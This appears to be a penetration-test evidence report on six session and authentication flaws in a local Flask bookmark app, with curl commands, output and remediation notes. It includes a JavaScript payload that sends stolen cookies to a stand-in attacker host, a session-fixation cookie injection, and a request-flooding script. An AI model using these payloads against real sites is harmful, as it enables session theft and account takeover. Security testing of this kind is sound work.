# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Session Hijacking via HTTP Transport (MITM Attack)

**Summary:**
- **Vulnerable location:** All endpoints - HTTP-only transport (port 80)
- **Overview:** Application transmits session cookies in plaintext over HTTP without TLS encryption or HSTS headers, enabling trivial session hijacking via man-in-the-middle (MITM) attacks
- **Impact:** Complete account takeover - attacker can intercept session cookies and impersonate any user
- **Severity:** Critical

**Prerequisites:**
- Attacker positioned on network path (public WiFi, compromised router, ISP-level access)
- Victim accessing application over HTTP at http://localhost:45971

**Exploitation Steps:**

1. **Victim creates session and adds sensitive bookmark:**
```bash
curl -s -c /tmp/victim_session.txt http://localhost:45971/list > /dev/null
curl -s -b /tmp/victim_session.txt -c /tmp/victim_session.txt \
  -X POST -d "name=SecretFlag&url=https://secret-company-data.com/flag" \
  http://localhost:45971/add > /dev/null
```

2. **Attacker intercepts HTTP traffic (MITM) and captures cookies:**
```bash
# Cookies transmitted in plaintext:
cat /tmp/victim_session.txt
# Output shows:
# localhost  FALSE  /  FALSE  0  user  53688fc7dea54b17a62705d3c120e417
# localhost  FALSE  /  FALSE  0  bookmarks  gASVZQAAAAAAAABdlIw...
```

3. **Attacker replays stolen cookies to hijack session:**
```bash
curl -s -b /tmp/victim_session.txt http://localhost:45971/list | grep "SecretFlag"
```

4. **Attacker can now modify victim's data:**
```bash
curl -s -b /tmp/victim_session.txt -c /tmp/victim_session.txt \
  -X POST -d "name=Backdoor&url=https://attacker.com/exfiltrate" \
  http://localhost:45971/add
```

**Proof of Impact:**
Successfully accessed victim's private bookmarks including "SecretFlag" pointing to `https://secret-company-data.com/flag` and injected malicious "Backdoor" bookmark. Complete session takeover achieved through cookie replay.

**Notes:**
- No TLS/HTTPS configuration exists (Apache VirtualHost *:80 only)
- No HSTS headers to enforce HTTPS
- No Secure flag on cookies (see AUTH-VULN-02)
- Attack works on any network where traffic can be intercepted (WiFi, LAN, WAN)

---

### AUTH-VULN-02: Session Cookie Theft via Missing HttpOnly Flag

**Summary:**
- **Vulnerable location:** All cookie-setting endpoints (/list, /add, /delete)
- **Overview:** Session cookies (`user` and `bookmarks`) lack HttpOnly flag, allowing JavaScript to access and exfiltrate cookies via XSS attacks
- **Impact:** Session hijacking via XSS - stolen cookies enable complete account takeover
- **Severity:** High

**Prerequisites:**
- Existing XSS vulnerability in application (documented by XSS specialist)
- OR attacker-controlled JavaScript in victim's browser context

**Exploitation Steps:**

1. **Victim creates session with sensitive data:**
```bash
# Access application and create bookmark
curl -s http://localhost:45971/list
curl -s -X POST -d "name=SensitiveData&url=https://company-secrets.com/api" \
  http://localhost:45971/add
```

2. **Attacker injects JavaScript payload (via existing XSS) to steal cookies:**
```javascript
// Execute in victim's browser console or via XSS payload:
const cookies = document.cookie;
console.log("Stolen cookies:", cookies);
// Output: "user=91532604108148d7bb3d11157fe8f358; bookmarks=gASVYwAAAAAAAABdlIwK..."

// In real attack, exfiltrate to attacker server:
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
```

3. **Attacker uses stolen cookies to hijack session:**
```bash
# Set stolen cookies in attacker's request:
curl -s -b "user=91532604108148d7bb3d11157fe8f358; bookmarks=gASVYwAAAAAAAABdlIwK..." \
  http://localhost:45971/list
```

**Proof of Impact:**
JavaScript successfully accessed session cookies containing user identifier and serialized bookmark data. Demonstrated in browser that `document.cookie` returns full session state:
```
"user=91532604108148d7bb3d11157fe8f358; bookmarks=gASVYwAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMDVNlbnNpdGl2ZURhdGGUjAN1cmyUjB9odHRwczovL2NvbXBhbnktc2VjcmV0cy5jb20vYXBplHViYS4="
```

**Notes:**
- All `set_cookie()` calls lack `httponly=True` parameter (routes.py lines 43-44, 66-67, 84-85)
- Combined with stored XSS vulnerability (javascript: protocol URLs), creates complete attack chain
- Also missing: Secure flag (HTTP transmission), SameSite flag (CSRF protection)

---

### AUTH-VULN-03: Indefinite Session Validity (No Timeout)

**Summary:**
- **Vulnerable location:** Session management architecture - no timeout mechanism
- **Overview:** Session cookies have no expiration (max_age/expires) and no server-side timeout enforcement, allowing stolen sessions to be valid indefinitely
- **Impact:** Unlimited exploitation window - stolen sessions never expire
- **Severity:** Medium

**Prerequisites:**
- Stolen session cookies (via AUTH-VULN-01 or AUTH-VULN-02)

**Exploitation Steps:**

1. **Create victim session and capture cookies:**
```bash
curl -s -c /tmp/session_timeout_test.txt http://localhost:45971/list > /dev/null
curl -s -b /tmp/session_timeout_test.txt -c /tmp/session_timeout_test.txt \
  -X POST -d "name=OldSession&url=https://old-data.com" \
  http://localhost:45971/add > /dev/null
echo "Session created at: $(date)"
```

2. **Wait 30+ seconds (simulate time passing after session theft):**
```bash
sleep 30
```

3. **Verify stolen session remains valid without timeout:**
```bash
curl -s -b /tmp/session_timeout_test.txt http://localhost:45971/list | grep "OldSession"
# Output: OldSession (appears twice in HTML)
```

**Proof of Impact:**
Session remained fully functional after 30 seconds with no timeout or expiration. In production scenarios, stolen sessions from AUTH-VULN-01 (MITM) or AUTH-VULN-02 (XSS) would remain valid indefinitely, giving attackers unlimited time to exploit compromised accounts.

**Notes:**
- No `max_age` or `expires` parameters on any `set_cookie()` calls
- No Flask `PERMANENT_SESSION_LIFETIME` configuration
- No server-side session timeout logic
- Sessions persist until browser closure (no automatic expiration)

---

### AUTH-VULN-04: Session Fixation Attack

**Summary:**
- **Vulnerable location:** Session creation logic (/list endpoint, routes.py:38-44)
- **Overview:** Application accepts arbitrary attacker-supplied UUID values without validation, enabling session fixation attacks where attacker forces victim to use known session identifier
- **Impact:** Account takeover - attacker can monitor all victim activity using pre-set session ID
- **Severity:** Medium

**Prerequisites:**
- Ability to set victim's cookies (via XSS, social engineering, or malicious link)

**Exploitation Steps:**

1. **Attacker generates known UUID:**
```bash
ATTACKER_UUID="FIXEDUUID999"
echo "Attacker controls UUID: $ATTACKER_UUID"
```

2. **Attacker forces victim to use this UUID (simulating XSS cookie injection):**
```javascript
// Via XSS payload or social engineering:
document.cookie = "user=FIXEDUUID999; path=/";
document.cookie = "bookmarks=gARdlC4=; path=/";
```

3. **Victim uses fixed session and adds sensitive data:**
```bash
curl -s -b "user=FIXEDUUID999; bookmarks=gARdlC4=" -c /tmp/victim_fixed.txt \
  -X POST -d "name=Password&url=https://secrets.com/pwd" \
  http://localhost:45971/add > /dev/null
```

4. **Attacker accesses victim's data using the known fixed UUID:**
```bash
curl -s -b /tmp/victim_fixed.txt http://localhost:45971/list | grep "Password"
# Output shows victim's "Password" bookmark visible to attacker
```

**Proof of Impact:**
Successfully forced victim to use attacker-controlled UUID "FIXEDUUID999". Victim added bookmark "Password" with URL `https://secrets.com/pwd`. Attacker then accessed this sensitive data using the same fixed UUID, demonstrating complete session fixation vulnerability.

**Notes:**
- No server-side validation that UUID was legitimately issued (routes.py:38,62,79)
- Despite UUID4 providing 128-bit entropy, stateless architecture allows fixation
- Combined with AUTH-VULN-02 (no HttpOnly), XSS can set cookies to execute fixation

---

### AUTH-VULN-05: Brute Force Session Creation (No Rate Limiting)

**Summary:**
- **Vulnerable location:** All endpoints - no rate limiting implemented
- **Overview:** Application has no rate limiting on session creation or any endpoint, allowing unlimited automated requests for brute force attacks and resource exhaustion
- **Impact:** Denial of Service (DoS), session flooding, resource exhaustion
- **Severity:** Medium

**Prerequisites:**
- Network access to http://localhost:45971

**Exploitation Steps:**

1. **Execute automated brute force attack with 100 rapid session creation requests:**
```python
import requests
import time

target = "http://localhost:45971/list"
start_time = time.time()
results = {"success": 0, "failed": 0}

for i in range(100):
    response = requests.get(target)
    if response.status_code == 200:
        results["success"] += 1
    else:
        results["failed"] += 1

elapsed = time.time() - start_time
print(f"Successful: {results['success']}")
print(f"Failed: {results['failed']}")
print(f"Time: {elapsed:.2f}s")
print(f"Rate: {results['success']/elapsed:.2f} req/s")
```

2. **Observe results:**
```
Successful: 100
Failed: 0
Time: 0.18s
Rate: 559.24 req/s
```

**Proof of Impact:**
Successfully executed 100 consecutive session creation requests in 0.18 seconds (559 requests/second) with zero failures or rate limiting. All requests returned 200 OK, demonstrating:
- No IP-based rate limiting
- No session creation throttling
- No CAPTCHA protection
- No monitoring or alerting for attack patterns

This enables:
- Unlimited session flooding attacks
- Resource exhaustion (memory, CPU, storage)
- Denial of Service (DoS)
- Brute force attacks without detection

**Notes:**
- No Flask-Limiter or rate limiting middleware installed
- No Apache rate limiting modules configured (mod_ratelimit, mod_evasive)
- No per-IP throttling
- No monitoring for suspicious activity patterns

---

### AUTH-VULN-06: Session Persistence After Compromise (No Logout)

**Summary:**
- **Vulnerable location:** Application-wide - no logout endpoint exists
- **Overview:** No logout mechanism or session invalidation functionality exists, preventing users from terminating compromised sessions
- **Impact:** Stolen sessions cannot be revoked - attackers retain permanent access
- **Severity:** Medium

**Prerequisites:**
- Compromised session (via any of AUTH-VULN-01 through AUTH-VULN-04)

**Exploitation Steps:**

1. **Verify no /logout endpoint exists:**
```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}" http://localhost:45971/logout
# Output: HTTP Status: 404
```

2. **Simulate session compromise:**
```bash
curl -s -c /tmp/compromised.txt http://localhost:45971/list > /dev/null
curl -s -b /tmp/compromised.txt -c /tmp/compromised.txt \
  -X POST -d "name=Compromised&url=https://hacked.com" \
  http://localhost:45971/add > /dev/null
echo "Session compromised - attacker has stolen cookies"
```

3. **Victim realizes compromise and searches for logout:**
```bash
curl -s http://localhost:45971/about | grep -i "logout"
# Output: (no matches - no logout functionality exists)
```

4. **Attacker continues using stolen session indefinitely:**
```bash
curl -s -b /tmp/compromised.txt http://localhost:45971/list | grep "Compromised"
# Output: Compromised (session still active)
```

**Proof of Impact:**
- `/logout` endpoint returns 404 (does not exist)
- No logout links in any application pages
- No `clear_cookie()` calls in codebase
- Victim cannot terminate compromised session
- Attacker retains access indefinitely until victim manually clears browser cookies

Combined with AUTH-VULN-03 (no timeout), stolen sessions remain valid forever with no recovery mechanism for victims.

**Notes:**
- No logout route defined in routes.py (only /, /list, /add, /delete, /about)
- No session invalidation logic exists
- Stateless architecture makes server-side revocation impossible
- Users have zero ability to protect themselves after compromise

---
